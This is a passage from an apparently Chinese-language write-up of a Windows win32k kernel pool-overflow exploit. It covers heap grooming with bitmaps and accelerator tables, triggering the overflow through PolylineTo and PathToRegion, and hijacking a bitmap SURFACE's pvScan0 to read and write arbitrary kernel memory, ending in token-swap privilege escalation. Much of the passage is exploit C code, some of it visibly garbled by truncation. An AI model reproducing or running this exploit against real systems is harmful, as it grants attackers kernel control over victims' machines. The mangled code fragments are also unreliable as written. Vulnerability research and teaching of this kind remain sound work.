            DestroyAcceleratorTable(hacctab[i]);
            hacctab[i] = NULL;
        }
        DebugBreak();
        BOOL ret = FALSE;
        for (LONG i = 0; i  0; i -= min(maxLimit, i))
        {
            ret = PolylineTo(hdc, &point[maxCount - i], min(maxLimit, i));
        }
        EndPath(hdc);           // deactivate the path
        HRGN hRgn = PathToRegion(hdc);
        return 0;
    }
因为0x18字节不方便占位，所以我们稍微提高画线数目为0x6666667，使得分配0x68大小的内存，加上0x8字节的POOL_HEADER就是0x70字节。我们先调用`CreateBitmap`
函数申请大量的`0xF90` 大小的内存块，以留下足够多的 `0x70` 字节间隙作为 `RGNMEMOBJ::vCreate`函数分配 `0x70`
字节内存块时的空间候选。但是因为SURFACE结构本身就要占用0x154字节，所以使用 `CreateAcceleratorTable` 函数。通过调用比
`CreateBitmap` 更多次数的 `CreateAcceleratorTableA` 函数创建 `AcceleratorTable`
内核对象以填充内存空隙、然后在其中制造空洞的方式，为使 `RGNMEMOBJ::vCreate` 分配的内存块能够命中我们安排的空洞提升更大的概率。随后通过
`DestroyAcceleratorTable` 函数释放掉中间一部分 `AcceleratorTable` 对象，为
`RGNMEMOBJ::vCreate` 函数留下足够多的机会。
现在，`RGNMEMOBJ::vCreate` 函数分配的内存块成功命中在我们安排的内存间隙中，其相邻的内存页也都符合我们先前构造的内存布局。
## 溢出覆盖内存块
因为创建的线条实在太多，会进行很大范围的内存访问，不利于后续操作，我们需要限制`AddEdgeToGET` 函数的访问范围。
    if ( pClipRect )
      {
        if ( iYEnd top || iYStart > pClipRect->bottom )
          return pFreeEdge;
        if ( iYStart top )
        {
          bClip = 1;
          iYStart = pClipRect->top;
        }
        if ( iYEnd > pClipRect->bottom )
          iYEnd = pClipRect->bottom;
      }
      ipFreeEdge_Y = (iYStart + 15) >> 4;
      *((_DWORD *)pFreeEdge + 3) = ipFreeEdge_Y;
      *((_DWORD *)pFreeEdge + 1) = ((iYEnd + 15) >> 4) - ipFreeEdge_Y;
      if ( ((iYEnd + 15) >> 4) - ipFreeEdge_Y 
    #include 
    #include 
    CONST LONG maxCount = 0x6666667;
    CONST LONG maxLimit = 0x4E2000;
    static POINT point[maxCount] = { 0 };
    CONST LONG maxTimes = 5000;
    CONST LONG tmpTimes = 7000;
    static HBITMAP hbitmap[maxTimes] = { NULL };
    static HACCEL  hacctab[tmpTimes] = { NULL };
    VOID
    CreateClipboard(DWORD Size)
    {
        PBYTE Buffer = (PBYTE)malloc(Size);
        FillMemory(Buffer, Size, 0x41);
        Buffer[Size - 1] = 0x00;
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (SIZE_T)Size);
        CopyMemory(GlobalLock(hMem), Buffer, (SIZE_T)Size);
        GlobalUnlock(hMem);
        SetClipboardData(CF_TEXT, hMem);
    }
    int main(int argc, char* argv[])
    {
        for (LONG i = 0; i  0; i -= min(maxLimit, i))
        {
            ret = PolylineTo(hdc, &point[maxCount - i], min(maxLimit, i));
        }
        ret = EndPath(hdc);
        // 0xF90+0x70=0x1000
        for (LONG i = 0; i  0x2D0)
        {
            index = i;
            break;
        }
    }
    hbmpmain = hbitmap[index];
我们通过循环调用 `GetBitmapBits` 函数遍历位图句柄数组以定位被覆盖数据的位图 `SURFACE` 对象的句柄，获取 `0x1000`
字节的一整个内存页大小的位图数据。大部分配有被覆盖数据的位图 `SURFACE` 对象的像素点数据区域大小仍旧是原来的
`0xB1*0x01*4=0x2C4` 字节大小，所以返回值只可能是不超过 `0x2C4` 的数值；而针对被我们覆盖数据的主控位图 `SURFACE`
对象而言，由于 `sizlBitmap` 成员的值被覆盖成 `0x01` 和 `0xFFFFFFFF`
数值，所以在计算位图像素点数据“实际大小”时，计算出来的结果是 `0x(3)FFFFFFFC`，这是一个发生溢出的数值，高于 `32`
位的数据被舍弃。这样的话，当遍历到主控位图对象的句柄时，函数的返回值将必然是比 `0x2D0` 大的数，因此得以命中。命中成功后 `pBmpHunted`
缓冲区中就存储了从当前位图对象的位图像素点数据区域起始地址开始的 `0x1000` 字节范围的内存数据。
    BOOL xxPointToHit(LONG addr, PVOID pvBits, DWORD cb)
    {
        LONG ret = 0;
        pBmpHunted[iExtpScan0] = addr;
        ret = SetBitmapBits(hBmpHunted, 0x1000, pBmpHunted);
        if (ret so.pvScan0` 成员域的值，这样一来只要将扩展位图
`SURFACE` 对象的 `SURFACE->so.pvScan0`
成员域修改为任意内核地址，便可轻松实现对内核任意地址的读写，“指哪打哪”的目的就实现了。
## 提权
这一部分就大同小异了，直接替换Token就好。至此，我们成功实现了提权。
# 参考文章